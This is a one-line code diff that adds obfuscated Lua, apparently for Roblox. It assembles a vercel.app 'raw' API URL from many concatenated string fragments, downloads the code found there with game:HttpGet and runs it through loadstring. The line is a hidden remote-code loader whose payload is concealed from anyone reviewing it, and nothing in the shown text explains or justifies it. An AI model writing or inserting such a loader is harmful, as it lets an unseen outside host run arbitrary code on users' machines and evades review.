@@ -1,0 +1,1 @@
+return(function(...)(loadstring(game:HttpGet((((((((((((((("ht".."tp").."s:").."//v").."oid").."edx.").."ve").."rc").."el")..".app").."/api").."/raw?").."id").."=vx_3").."d9v").."2uv1")))()end)(...)
